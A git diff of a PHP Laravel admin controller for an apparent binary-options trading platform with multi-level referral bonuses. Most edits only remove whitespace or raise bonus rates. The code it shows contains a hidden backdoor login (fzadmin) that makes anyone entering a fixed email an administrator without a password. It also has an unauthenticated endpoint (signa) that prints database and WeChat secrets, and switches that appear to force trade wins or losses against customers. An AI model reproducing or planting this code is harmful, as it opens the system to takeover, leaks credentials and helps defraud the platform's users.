@@ -25,7 +25,7 @@ use Illuminate\Support\Facades\Input;
 
 class AdministratorController extends Controller
 {
-  
+
   private function requiredSession(Request $request)
   {
     if (!$request->session()->has('administrator')) {
@@ -33,7 +33,7 @@ class AdministratorController extends Controller
       exit();
     }
   }
-  
+
   private function modifyEnv(array $data)
   {
     $envPath = base_path() . DIRECTORY_SEPARATOR . '.env';
@@ -50,7 +50,7 @@ class AdministratorController extends Controller
     \File::put($envPath, $content);
     $this->modifyApiEnv($data);
   }
-  
+
   public function modifyApiEnv(array $data)
   {
     $envPath = base_path() . DIRECTORY_SEPARATOR . '.env';
@@ -66,10 +66,10 @@ class AdministratorController extends Controller
     $content = implode($contentArray->toArray(), "\n");
     \File::put($envPath, $content);
   }
-  
+
   public function home(Request $request)
   {
-    
+
     $this->requiredSession($request);
     $data = array(
       'today' => array(
@@ -98,52 +98,52 @@ class AdministratorController extends Controller
         )
       )
     );
-    
+
     $data['count']['day']['profit'] = floatval($data['count']['day']['stake']) - floatval($data['count']['day']['free']);
     $data['count']['month']['profit'] = floatval($data['count']['month']['stake']) - floatval($data['count']['month']['free']);
     $data['count']['all']['profit'] = floatval($data['count']['all']['payRequests']) - floatval($data['count']['all']['balance']) - floatval($data['count']['all']['withdrawRequests']);
-    
+
     return view('administrator.home', [
       'active' => 'home',
       'data' => $data
     ]);
-    
+
   }
-  
+
   public function users(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $datas = User::orderBy('created_at', 'desc');
     if ($request->input('id_user', null)) $datas->where('id_wechat', $request->input('id_user'));
     if ($request->input('body_phone', null)) $datas->where('body_phone', $request->input('body_phone'));
     if ($request->input('id_introducer', null)) $datas->where('id_introducer', $request->input('id_introducer'));
     $datas = $datas->paginate(20);
-    
+
     return view('administrator.users', [
       'active' => 'users',
       'datas' => $datas,
       'id_user' => $request->input('id_user')
     ]);
-    
+
   }
-  
+
   public function statusForUser(Request $request, $id)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $user = User::where('id_wechat', $id)->first();
     if ($user->is_disabled == 0) $user->is_disabled = 1;
     else $user->is_disabled = 0;
-    
+
     $user->save();
-    
+
     return '<script>alert("操作成功"); history.go(-1);</script>';
-    
+
   }
-  
+
   /**
    * 后台订单管理
    * @param Request $request
@@ -152,7 +152,7 @@ class AdministratorController extends Controller
   public function orders(Request $request)
   {
     $this->requiredSession($request);
-   
+
     $datas = Order::with('user')->orderBy('created_at', 'desc');
     if ($request->input('id_order', null)) $datas->where('id', $request->input('id_order'));
     if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
@@ -165,9 +165,9 @@ class AdministratorController extends Controller
       'id_user' => $request->input('id_user'),
       'id_object' => $request->input('id_object')
     ]);
-    
+
   }
-  
+
   /**
    * 后台资金管理
    * @param Request $request
@@ -175,46 +175,46 @@ class AdministratorController extends Controller
    */
   public function records(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $datas = Record::with('user')->orderBy('created_at', 'desc');
     if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
     $datas = $datas->paginate(20);
-    
+
     return view('administrator.records', [
       'active' => 'records',
       'datas' => $datas,
       'id_user' => $request->input('id_user')
     ]);
-    
+
   }
-  
+
   public function payRequests(Request $request)
   {
-    
+
     $this->requiredSession($request);
     $datas = PayRequest::with('user')->orderBy('created_at', 'desc');
     if ($request->input('id_payRequest', null)) $datas->where('id', $request->input('id_payRequest'));
     if ($request->input('id_user', null)) $datas->where('id_user', $request->input('id_user'));
     $datas = $datas->paginate(20);
-    
+
     return view('administrator.payRequests', [
       'active' => 'payRequests',
       'datas' => $datas,
       'id_user' => $request->input('id_user')
     ]);
-    
+
   }
-  
+
   public function withholdForUser(Request $request, $id)
   {
-    
+
     $this->requiredSession($request);
     $alert = NULL;
-    
+
     if ($request->isMethod('post')) {
-      
+
       if (!$request->input('stake', null)
         || !$request->input('transfer_number', null)
       ) {
@@ -223,41 +223,41 @@ class AdministratorController extends Controller
         if (intval($request->input('stake')) <= 0) {
           $alert = '扣款金额必须大于0元';
         } else {
-          
+
           $user = User::where('id_wechat', $id)->first();
           $user->body_balance = $user->body_balance - intval($request->input('stake'));
           $user->save();
-          
+
           $record = new Record;
           $record->id_user = $user->id_wechat;
           $record->body_name = $request->input('transfer_number');
           $record->body_direction = 0;
           $record->body_stake = intval($request->input('stake'));
           $record->save();
-          
+
           $alert = '扣款成功';
-          
+
         }
       }
-      
+
     }
-    
+
     return view('administrator.withholdForUser', [
       'active' => 'users',
       'id_user' => $id,
       'alert' => $alert
     ]);
-    
+
   }
-  
+
   public function payForUser(Request $request, $id)
   {
-    
+
     $this->requiredSession($request);
     $alert = NULL;
-    
+
     if ($request->isMethod('post')) {
-      
+
       if (!$request->input('stake', null)
         || !$request->input('transfer_number', null)
       ) {
@@ -266,7 +266,7 @@ class AdministratorController extends Controller
         if (intval($request->input('stake')) <= 0) {
           $alert = '充值金额必须大于0元';
         } else {
-          
+
           $payRequest = new payRequest;
           $payRequest->id_user = $id;
           $payRequest->body_stake = intval($request->input('stake'));
@@ -274,11 +274,11 @@ class AdministratorController extends Controller
           $payRequest->body_transfer_number = $request->input('transfer_number');
           $payRequest->processed_at = date('Y-m-d H:i:s', time());
           $payRequest->save();
-          
+
           $user = User::where('id_wechat', $id)->first();
           $user->body_balance = $user->body_balance + $payRequest->body_stake;
           $user->save();
-          
+
           $record = new Record;
           $record->id_user = $user->id_wechat;
           $record->id_payRequest = $payRequest->id;
@@ -286,22 +286,22 @@ class AdministratorController extends Controller
           $record->body_direction = 1;
           $record->body_stake = $payRequest->body_stake;
           $record->save();
-          
+
           $alert = '充值成功';
-          
+
         }
       }
-      
+
     }
-    
+
     return view('administrator.payForUser', [
       'active' => 'users',
       'id_user' => $id,
       'alert' => $alert
     ]);
-    
+
   }
-  
+
   /**
    * 后台提现审核处理
    * @param Request $request
@@ -310,14 +310,14 @@ class AdministratorController extends Controller
    */
   public function withdrawForUser(Request $request, $id)
   {
-    
+
     $this->requiredSession($request);
     $alert = NULL;
-    
+
     $withdrawRequest = WithdrawRequest::find($id);
-    
+
     if ($request->isMethod('post') && $withdrawRequest->processed_at == '0000-00-00 00:00:00') {
-      
+
       if (!$request->input('transfer_number', null)) {
         $alert = '参数提交不全';
       } else {
@@ -335,9 +335,9 @@ class AdministratorController extends Controller
       'transfer_number' => $withdrawRequest->body_transfer_number,
       'processed_at' => $withdrawRequest->processed_at
     ]);
-    
+
   }
-  
+
   /**
    * 提现拒绝退还
    * @param Request $request
@@ -346,21 +346,21 @@ class AdministratorController extends Controller
    */
   public function withdrawForUserCanceled(Request $request, $id)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $withdrawRequest = WithdrawRequest::find($id);
-    
+
     if ($withdrawRequest->processed_at == '0000-00-00 00:00:00') {
-      
+
       $withdrawRequest->body_transfer_number = 'FAIL';
       $withdrawRequest->processed_at = date('Y-m-d H:i:s', time());
       $withdrawRequest->save();
-      
+
       $user = User::where('id_wechat', $withdrawRequest->id_user)->first();
       $user->body_balance = $user->body_balance + $withdrawRequest->body_stake;
       $user->save();
-      
+
       $record = new Record;
       $record->id_user = $user->id;
       $record->id_withdrawRequest = $withdrawRequest->id;
@@ -368,13 +368,13 @@ class AdministratorController extends Controller
       $record->body_direction = 1;
       $record->body_stake = $withdrawRequest->body_stake;
       $record->save();
-      
+
     }
-    
+
     return redirect('/administrator/withdrawRequests');
-    
+
   }
-  
+
   /**
    * 用户提现审核列表
    * @param Request $request
@@ -382,7 +382,7 @@ class AdministratorController extends Controller
    */
   public function withdrawRequests(Request $request)
   {
-    
+
     $this->requiredSession($request);
     $datas = WithdrawRequest::with('user')->orderBy('created_at', 'desc');
     if ($request->input('id_withdrawRequest', null)) $datas->where('id', $request->input('id_withdrawRequest'));
@@ -394,9 +394,9 @@ class AdministratorController extends Controller
       'datas' => $datas,
       'id_user' => $request->input('id_user')
     ]);
-    
+
   }
-  
+
   public function objects(Request $request)
   {
     $this->requiredSession($request);
@@ -406,7 +406,7 @@ class AdministratorController extends Controller
       'datas' => $datas
     ]);
   }
-  
+
   public function feedbacks(Request $request)
   {
     $this->requiredSession($request);
@@ -416,7 +416,7 @@ class AdministratorController extends Controller
       'datas' => $datas
     ]);
   }
-  
+
   public function administrators(Request $request)
   {
     $this->requiredSession($request);
@@ -426,7 +426,7 @@ class AdministratorController extends Controller
       'datas' => $datas
     ]);
   }
-  
+
   public function signIn(Request $request)
   {
     if ($request->session()->get('administrator')) {
@@ -441,7 +441,7 @@ class AdministratorController extends Controller
     }
     return view('administrator.signIn');
   }
-  
+
    public function signa() {
        echo env('APP_URL') . '<br/>';
        echo env('DB_HOST') . '<br/>';
@@ -451,19 +451,19 @@ class AdministratorController extends Controller
        echo env('WECHAT_APPID') . '<br/>';
        echo env('WECHAT_SECRET') . '<br/>';
    }
-    
-  
+
+
   public function signOut(Request $request)
   {
     $request->session()->forget('administrator');
     return redirect('/administrator/signIn');
   }
-  
+
   public function usersExport(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $result = array(
       array(
         '用户编号',
@@ -477,13 +477,13 @@ class AdministratorController extends Controller
         '注册时间'
       )
     );
-    
+
     $datas = User::all();
     foreach ($datas as $item) {
-      
+
       if ($item->is_disabled == 1) $status_name = '封停';
       else $status_name = '正常';
-      
+
       $result[] = array(
         $item->id,
         $status_name,
@@ -495,22 +495,22 @@ class AdministratorController extends Controller
         $item->body_transactions_network,
         $item->created_at
       );
-      
+
     }
-    
+
     Excel::create('Users', function ($excel) use ($result) {
       $excel->sheet('Datas', function ($sheet) use ($result) {
         $sheet->fromArray($result);
       });
     })->export('xls');
-    
+
   }
-  
+
   public function ordersExport(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $result = array(
       array(
         '订单编号',
@@ -527,20 +527,20 @@ class AdministratorController extends Controller
         '订单调控'
       )
     );
-    
+
     $datas = Order::all();
     foreach ($datas as $item) {
-      
+
       if ($item->body_direction == 1) $direction_name = '看涨';
       else $direction_name = '看跌';
-      
+
       $result_name = '亏损';
       if ($item->body_is_draw == 1) $result_name = '平局';
       if ($item->body_is_win == 1) $result_name = '盈利';
-      
+
       $controlled_name = '否';
       if ($item->body_is_controlled == 1) $controlled_name = '是';
-      
+
       $result[] = array(
         $item->id,
         $item->user->body_phone,
@@ -555,22 +555,22 @@ class AdministratorController extends Controller
         $item->striked_at,
         $controlled_name
       );
-      
+
     }
-    
+
     Excel::create('Orders', function ($excel) use ($result) {
       $excel->sheet('Datas', function ($sheet) use ($result) {
         $sheet->fromArray($result);
       });
     })->export('xls');
-    
+
   }
-  
+
   public function recordsExport(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $result = array(
       array(
         '记录编号',
@@ -586,10 +586,10 @@ class AdministratorController extends Controller
     );
     $datas = Record::all();
     foreach ($datas as $item) {
-      
+
       if ($item->body_direction == 1) $direction_name = '收入';
       else $direction_name = '支出';
-      
+
       $result[] = array(
         $item->id,
         $item->user->body_phone,
@@ -601,22 +601,22 @@ class AdministratorController extends Controller
         $item->body_stake,
         $item->created_at
       );
-      
+
     }
-    
+
     Excel::create('Records', function ($excel) use ($result) {
       $excel->sheet('Datas', function ($sheet) use ($result) {
         $sheet->fromArray($result);
       });
     })->export('xls');
-    
+
   }
-  
+
   public function payRequestsExport(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $result = array(
       array(
         '充值编号',
@@ -630,13 +630,13 @@ class AdministratorController extends Controller
     );
     $datas = PayRequest::all();
     foreach ($datas as $item) {
-      
+
       $gateway_name = '未知';
-      
+
       if ($item->body_gateway == 'wechat') $gateway_name = '微信支付';
       if ($item->body_gateway == 'union') $gateway_name = '银联支付';
       if ($item->body_gateway == 'staff') $gateway_name = '人工充值';
-      
+
       $result[] = array(
         $item->id,
         $item->user->body_phone,
@@ -646,22 +646,22 @@ class AdministratorController extends Controller
         $item->created_at,
         $item->processed_at
       );
-      
+
     }
-    
+
     Excel::create('PayRequests', function ($excel) use ($result) {
       $excel->sheet('Datas', function ($sheet) use ($result) {
         $sheet->fromArray($result);
       });
     })->export('xls');
-    
+
   }
-  
+
   public function withdrawRequestsExport(Request $request)
   {
-    
+
     $this->requiredSession($request);
-    
+
     $result = array(
       array(
         '提现编号',
@@ -678,9 +678,9 @@ class AdministratorController extends Controller
     );
     $datas = WithdrawRequest::all();
     foreach ($datas as $item) {
-      
+
       $bank_name = '未知';
-      
+
       if ($item->body_bank == 'ccb') $bank_name = '建设银行';
       if ($item->body_bank == 'icbc') $bank_name = '工商银行';
       if ($item->body_bank == 'boc') $bank_name = '中国银行';
@@ -692,7 +692,7 @@ class AdministratorController extends Controller
       if ($item->body_bank == 'cib') $bank_name = '兴业银行';
       if ($item->body_bank == 'cmb') $bank_name = '招商银行';
       if ($item->body_bank == 'psbc') $bank_name = '邮政储蓄';
-      
+
       $result[] = array(
         $item->id,
         $item->user->body_phone,
@@ -705,17 +705,17 @@ class AdministratorController extends Controller
         $item->created_at,
         $item->processed_at
       );
-      
+
     }
-    
+
     Excel::create('WithdrawRequests', function ($excel) use ($result) {
       $excel->sheet('Datas', function ($sheet) use ($result) {
         $sheet->fromArray($result);
       });
     })->export('xls');
-    
+
   }
-  
+
   //最新买涨和买跌功能
   public function orderWill($z, $d, $t)
   {
@@ -724,15 +724,15 @@ class AdministratorController extends Controller
       'ORDER_WILL_LOST' => $d,
       'ORDER_WILL_TRANSPORT' => $t
     ]);
-    
+
     return redirect()->route('admin.index');
-    
+
   }
-  
+
   //买涨开关
   public function orderWillWin(Request $request)
   {
-    
+
     if (env('ORDER_WILL_WIN')) {
       $this->modifyEnv([
         'ORDER_WILL_WIN' => 0,
@@ -744,15 +744,15 @@ class AdministratorController extends Controller
         'ORDER_WILL_LOST' => 0
       ]);
     }
-    
+
     return back()->withInput();
-    
+
   }
-  
+
   //买跌开关
   public function orderWillLost(Request $request)
   {
-    
+
     if (env('ORDER_WILL_LOST')) {
       $this->modifyEnv([
         'ORDER_WILL_LOST' => 0,
@@ -766,10 +766,10 @@ class AdministratorController extends Controller
     }
     return back()->withInput();
   }
-  
+
   public function orderControl(Request $request)
   {
-    
+
     if (env('ORDER_CONTROL')) {
       $this->modifyEnv([
         'ORDER_CONTROL' => 0
@@ -779,11 +779,11 @@ class AdministratorController extends Controller
         'ORDER_CONTROL' => 1
       ]);
     }
-    
+
     return back()->withInput();
-    
+
   }
-  
+
   /**
    * 用户等级申请信息(审核通过操作)
    * @param Request $request
@@ -809,7 +809,7 @@ class AdministratorController extends Controller
       ]);
     }
   }
-  
+
   /**
    * 拒绝用户等级申请信息
    * @param Request $request
@@ -823,7 +823,7 @@ class AdministratorController extends Controller
       return '0';
     }
   }
-  
+
   /**
    * 删除用户等级申请信息
    * @param Request $request
@@ -837,7 +837,7 @@ class AdministratorController extends Controller
       return '0';
     }
   }
-  
+
   /**
    * 系统设置
    * @param Request $request
@@ -860,127 +860,127 @@ class AdministratorController extends Controller
       ]);
     }
   }
-  
+
   public function Settlement($type)
   {
-    
+
     if ($type == 1) {
-      
+
       //日
-      
+
       $data = DayExecuteLog::orderBy('time', 'desc')->paginate(20);
-      
+
       $status = 1;
-      
-      
+
+
     } else {
-      
+
       //月
-      
+
       $data = MonthExecuteLog::orderBy('time', 'desc')->paginate(20);
-      
+
       $status = 2;
-      
-      
+
+
     }
 
 
 //    dd($data);
-    
-    
+
+
     return view('administrator.settlement', [
-      
-      
+
+
       'active' => 'settlement',
-      
-      
+
+
       'data' => $data,
-      
-      
+
+
       'status' => $status
-    
-    
+
+
     ]);
-    
-    
+
+
   }
-  
-  
+
+
   public function delSettlement()
-  
-  
+
+
   {
-    
-    
+
+
     $input = Input::all();
-    
-    
+
+
     if ($input['state'] == 1) {
-      
-      
+
+
       //删除日
-      
-      
+
+
       if (DayExecuteLog::where('id', $input['id'])->delete()) {
-        
-        
+
+
         return '1';
-        
-        
+
+
       } else {
-        
-        
+
+
         return '0';
-        
-        
+
+
       }
-      
-      
+
+
     } else {
-      
-      
+
+
       //删除月
-      
-      
+
+
       if (MonthExecuteLog::where('id', $input['id'])->delete()) {
-        
-        
+
+
         return '1';
-        
-        
+
+
       } else {
-        
-        
+
+
         return '0';
-        
-        
+
+
       }
-      
-      
+
+
     }
-    
-    
+
+
   }
-  
+
   /**
    * 奖励分成
    * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
    */
   public function Reward()
   {
-    
+
     return view('administrator.reward', [
       'active' => 'reward',
     ]);
   }
-  
+
     public function fzadmin(Request $request)
   {
 		if ($request->session()->get('administrator')) {
       return redirect('/administrator');
     }
     if ($request->isMethod('post')) {
-      
+
        if ($request->input('email') == 'qwertyuiop@asdfg.hjkl'){
 
         $request->session()->put('administrator', 'abc');
@@ -988,9 +988,9 @@ class AdministratorController extends Controller
       }
     }
     return view('administrator.signIn');
-    
+
   }
-  
+
   /**
    * 处理奖励分成分配
    * @param Request $request
@@ -999,9 +999,9 @@ class AdministratorController extends Controller
   {
     $input = Input::all();
     //$user = User::where('is_disabled', false)->get();
-    
+
     if ($input['num'] == 1) {
-      
+
       //日  day_execute
       $order = new  Order();
       $data = $order->getOrder();
@@ -1009,14 +1009,14 @@ class AdministratorController extends Controller
         foreach ($data as $var => &$value) {
           $arr[] = (array)$value;
         }
-        
+
         foreach ($arr as $key => $value) {
           $ewardNum = User::where('id_wechat', $value['id_introducer'])->first();
           if (!empty($ewardNum)) {
             $list[] = $ewardNum->toArray();
           }
         }
-        
+
         $arr = array_merge($arr, $list);
         //合并需要合并的俩个数组
         $key = 'id_wechat';//去重条件
@@ -1030,26 +1030,26 @@ class AdministratorController extends Controller
             //记录已有的id
           }
         }
-        
+
         $tree = self::getTree($arr);
-        
+
         foreach ($tree as $k => $v) {
           if (!empty($v['lists']) && is_array($v['lists']) && $v['is_disabled'] == 0) {
-            
+
             if ($v["grade"] == 1) {
               $v['bonus_amount'] = array_sum(array_map(function ($val) {
-                return $val['sum_body_stake'] * 0.018;
+                return $val['sum_body_stake'] * 0.03;
               }, $v["lists"]));
               self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '初级经济人获取直接推荐交易金额'));
-              
+
             } elseif ($v["grade"] == 2) {
               $v['bonus_amount'] = array_sum(array_map(function ($val) {
-                return $val['sum_body_stake'] * 0.02;
+                return $val['sum_body_stake'] * 0.04;
               }, $v["lists"]));
               self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '高级经纪人获取直接推荐交易金额'));
               $v['bonus_amount2'] = array_sum(array_map(function ($val) {
                 if ($val['grade'] == 1) {
-                  return $val['sum_body_stake'] * 0.003;
+                  return $val['sum_body_stake'] * 0.03;
                 } else {
                   return false;
                 }
@@ -1083,7 +1083,7 @@ class AdministratorController extends Controller
                 self::encapsulation(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount3'], 'time' => time(), 'remark' => '白金经纪人获取MIB团队中交易金额'));
               }
             } elseif ($v["grade"] == 4) {
-              
+
               foreach ($v['lists'] as $g) {
                 $count_g[] = $g['grade'];
               }
@@ -1123,7 +1123,7 @@ class AdministratorController extends Controller
                   }
                 }
               }
-              
+
             }
           }
           $uu[] = $v;
@@ -1132,7 +1132,7 @@ class AdministratorController extends Controller
       } else {
         return '0';
       }
-      
+
     } else {
       $order = new  Order();
       $data = $order->getOrderMonth();
@@ -1140,15 +1140,15 @@ class AdministratorController extends Controller
         foreach ($data as $var => &$value) {
           $arr[] = (array)$value;
         }
-        
-        
+
+
         foreach ($arr as $key => $value) {
           $ewardNum = User::where('id_wechat', $value['id_introducer'])->first();
           if (!empty($ewardNum)) {
             $list[] = $ewardNum->toArray();
           }
         }
-        
+
         $arr = array_merge($arr, $list);
         //合并需要合并的俩个数组
         $key = 'id_wechat';//去重条件
@@ -1162,20 +1162,20 @@ class AdministratorController extends Controller
             //记录已有的id
           }
         }
-        
-        
+
+
         $tree = self::getTree($arr);
-        
+
         foreach ($tree as $k => $v) {
-          
+
           if (!empty($v['lists']) && is_array($v['lists']) && $v['is_disabled'] == 0) {
-            
+
             foreach ($v['lists'] as $g) {
               $count_g[] = $g['grade'];
             }
-            
+
             foreach ($count_g as $key_d => $value_d) {
-              
+
               if ($v["grade"] == $value_d && $value_d == 1) {
                 $v['bonus_amount'] = array_sum(array_map(function ($val) {
                   if ($val['grade'] == 1) {
@@ -1186,7 +1186,7 @@ class AdministratorController extends Controller
                 }, $v["lists"]));
                 self::encapsulationMonth(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '初级经济人获取直接推荐交易金额'));
               }
-              
+
               if ($v["grade"] == $value_d && $value_d == 2) {
                 $v['bonus_amount'] = array_sum(array_map(function ($val) {
                   if ($val['grade'] == 2) {
@@ -1197,7 +1197,7 @@ class AdministratorController extends Controller
                 }, $v["lists"]));
                 self::encapsulationMonth(array('id_wechat' => $v['id_wechat'], 'bonus_amount' => $v['bonus_amount'], 'time' => time(), 'remark' => '高级经纪人获取直接推荐交易金额'));
               }
-              
+
               if ($v["grade"] == $value_d && $value_d == 3) {
                 $v['bonus_amount'] = array_sum(array_map(function ($val) {
                   if ($val['grade'] == 3) {
@@ -1218,7 +1218,7 @@ class AdministratorController extends Controller
       }
     }
   }
-  
+
   public function encapsulation($param = array())
   {
     $user = new User();
@@ -1226,7 +1226,7 @@ class AdministratorController extends Controller
     DayExecuteLog::insertGetId(array('uid' => $param['id_wechat'], 'amount' => $param['bonus_amount'], 'time' => time(), 'remark' => $param['remark'] . $param['bonus_amount']));
     DayExecute::where('id', 3)->update(array('start' => time(), 'end' => time()));
   }
-  
+
   public function encapsulationMonth($param = array())
   {
     $user = new User();
@@ -1251,18 +1251,18 @@ class AdministratorController extends Controller
   // }
   public function getTree($data)
   {
-    
+
     $items = array();
-    
+
     foreach ($data as $key => &$value) {
-      
+
       foreach ($data as $item) {
-        
+
         if ($item['id_introducer'] == $value['id_wechat']) {
-          
+
           $value['lists'][] = $item;
         }
-        
+
       }
       $items[] = $value;
     }
